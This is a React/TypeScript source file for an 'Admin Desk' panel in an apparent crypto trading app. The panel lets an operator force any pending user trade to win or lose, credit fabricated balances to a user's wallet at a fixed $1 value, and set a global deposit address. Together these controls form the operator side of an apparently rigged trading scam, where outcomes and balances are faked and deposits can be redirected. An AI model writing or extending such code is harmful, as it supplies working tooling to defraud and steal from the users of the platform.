import React, { useState } from 'react';
import { WalletData, ActiveTrade } from '../types';

interface AdminDeskProps {
  managedWallet: (WalletData & { email?: string }) | null;
  onClose: () => void;
  activeTrades: ActiveTrade[];
  onForceOutcome: (id: string, updates: Partial<ActiveTrade>) => void;
  onUpdateWallet: (wallet: (WalletData & { email?: string }) | null) => void;
}

const AdminDesk: React.FC<AdminDeskProps> = ({
  managedWallet,
  onClose,
  activeTrades,
  onForceOutcome,
  onUpdateWallet,
}) => {
  const [balanceSymbol, setBalanceSymbol] = useState('');
  const [balanceAmount, setBalanceAmount] = useState('');
  const [depositAddr, setDepositAddr] = useState('');

  const handleAddBalance = (e: React.FormEvent) => {
    e.preventDefault();
    if (!managedWallet || !balanceSymbol || !balanceAmount) return;

    const amount = parseFloat(balanceAmount);
    if (isNaN(amount)) return;

    const existingBalance = managedWallet.balances.find(b => b.symbol === balanceSymbol);
    if (existingBalance) {
      existingBalance.amount += amount;
      existingBalance.usdValue += amount * 1;
    } else {
      managedWallet.balances.push({
        symbol: balanceSymbol,
        amount,
        usdValue: amount * 1,
      });
    }

    onUpdateWallet({ ...managedWallet });
    setBalanceSymbol('');
    setBalanceAmount('');
  };

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-6 z-50">
      <div className="bg-[#181C25] border border-rose-500/30 rounded-2xl max-w-4xl w-full shadow-2xl max-h-[90vh] overflow-hidden flex flex-col">
        <div className="p-6 border-b border-rose-500/30 flex items-center justify-between bg-rose-500/5">
          <div>
            <h2 className="text-xl font-black uppercase tracking-tight text-rose-400">Admin Desk</h2>
            <div className="text-xs text-gray-500 mt-1">System Override Controls</div>
          </div>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white text-2xl leading-none transition-colors"
          >
            ×
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 space-y-6">
          <div className="bg-[#0B0E11] rounded-xl p-6 border border-rose-500/20">
            <h3 className="text-sm font-black uppercase tracking-wider text-rose-400 mb-4">
              Active Trades Override
            </h3>
            <div className="space-y-2 max-h-60 overflow-y-auto">
              {activeTrades.filter(t => t.status === 'pending').map((trade) => (
                <div
                  key={trade.id}
                  className="bg-[#181C25] border border-[#2B3139] rounded-xl p-4 flex items-center justify-between"
                >
                  <div className="flex-1">
                    <div className="text-xs text-gray-500">{trade.id}</div>
                    <div className="font-bold mt-1">
                      {trade.symbol} {trade.direction === 'up' ? '↑' : '↓'} ${trade.amount}
                    </div>
                    <div className="text-xs text-gray-400 mt-1">
                      {Math.floor((Date.now() - trade.startTime) / 1000)}s / {trade.duration}s
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <button
                      onClick={() => onForceOutcome(trade.id, { forceOutcome: 'win' })}
                      className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
                        trade.forceOutcome === 'win'
                          ? 'bg-emerald-600 text-white'
                          : 'bg-emerald-600/10 text-emerald-400 border border-emerald-600/30 hover:bg-emerald-600/20'
                      }`}
                    >
                      WIN
                    </button>
                    <button
                      onClick={() => onForceOutcome(trade.id, { forceOutcome: 'loss' })}
                      className={`px-4 py-2 rounded-lg text-xs font-bold transition-all ${
                        trade.forceOutcome === 'loss'
                          ? 'bg-rose-600 text-white'
                          : 'bg-rose-600/10 text-rose-400 border border-rose-600/30 hover:bg-rose-600/20'
                      }`}
                    >
                      LOSS
                    </button>
                  </div>
                </div>
              ))}
              {activeTrades.filter(t => t.status === 'pending').length === 0 && (
                <div className="text-center text-gray-500 py-8">No active trades</div>
              )}
            </div>
          </div>

          {managedWallet && (
            <div className="bg-[#0B0E11] rounded-xl p-6 border border-rose-500/20">
              <h3 className="text-sm font-black uppercase tracking-wider text-rose-400 mb-4">
                Balance Control
              </h3>
              <form onSubmit={handleAddBalance} className="flex gap-3">
                <input
                  type="text"
                  value={balanceSymbol}
                  onChange={(e) => setBalanceSymbol(e.target.value.toUpperCase())}
                  placeholder="Symbol (ETH)"
                  className="flex-1 px-4 py-3 bg-[#181C25] border border-[#2B3139] rounded-xl text-gray-100 focus:outline-none focus:border-rose-500 transition-colors"
                />
                <input
                  type="number"
                  step="0.000001"
                  value={balanceAmount}
                  onChange={(e) => setBalanceAmount(e.target.value)}
                  placeholder="Amount"
                  className="flex-1 px-4 py-3 bg-[#181C25] border border-[#2B3139] rounded-xl text-gray-100 focus:outline-none focus:border-rose-500 transition-colors"
                />
                <button
                  type="submit"
                  className="px-6 py-3 bg-rose-600 hover:bg-rose-700 rounded-xl font-bold transition-colors"
                >
                  ADD
                </button>
              </form>

              <div className="mt-4 space-y-2 max-h-40 overflow-y-auto">
                {managedWallet.balances.map((balance, idx) => (
                  <div
                    key={idx}
                    className="flex items-center justify-between bg-[#181C25] border border-[#2B3139] rounded-lg p-3"
                  >
                    <span className="font-bold">{balance.symbol}</span>
                    <span className="font-mono text-sm">{balance.amount.toFixed(6)}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          <div className="bg-[#0B0E11] rounded-xl p-6 border border-rose-500/20">
            <h3 className="text-sm font-black uppercase tracking-wider text-rose-400 mb-4">
              Deposit Address
            </h3>
            <div className="flex gap-3">
              <input
                type="text"
                value={depositAddr}
                onChange={(e) => setDepositAddr(e.target.value)}
                placeholder="Set global deposit address"
                className="flex-1 px-4 py-3 bg-[#181C25] border border-[#2B3139] rounded-xl text-gray-100 focus:outline-none focus:border-rose-500 transition-colors font-mono text-sm"
              />
              <button
                onClick={() => console.log('Deposit address set:', depositAddr)}
                className="px-6 py-3 bg-rose-600 hover:bg-rose-700 rounded-xl font-bold transition-colors"
              >
                SET
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminDesk;
